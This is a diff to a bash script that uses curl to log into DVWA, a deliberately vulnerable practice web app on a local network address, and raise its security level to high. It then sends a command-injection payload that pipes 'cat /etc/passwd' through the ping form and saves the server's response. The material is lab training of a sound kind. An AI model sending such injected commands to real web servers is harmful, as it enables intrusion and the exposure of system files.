@@ -6,7 +6,7 @@ curl -s -i -L -b dvwa.cookie -d $"username=admin&password=password&Login=Login&u
 CSRFSEC=$(curl -s -i -L -c dvwa.cookie.high -b dvwa.cookie 192.168.178.98/dvwa/security.php | awk -F 'value=' '/user_token/ {print $2}' | cut -d "'" -f2)
 SESSIONIDSEC=$(grep PHPSESSID dvwa.cookie | awk -F ' ' '{print $7}')
 curl -s -i -L -b dvwa.cookie.high -c dvwa.cookie.high -d $"security=high&seclev_submit=Submit&user_token=${CSRFSEC}" 192.168.178.98/dvwa/security.php > /dev/null
-#Check out the "bruteforce" page
+#Check out the "Command Injection" page
 curl -s -i -L -b dvwa.cookie.high "192.168.178.98/dvwa/vulnerabilities/exec/" > /dev/null
 #Get the server to 'cat /etc/passwd'
 curl -s -i -L -b dvwa.cookie.high "192.168.178.98/dvwa/vulnerabilities/exec/" -d "ip=%7Ccat+%2Fetc%2Fpasswd&Submit=Submit" > result
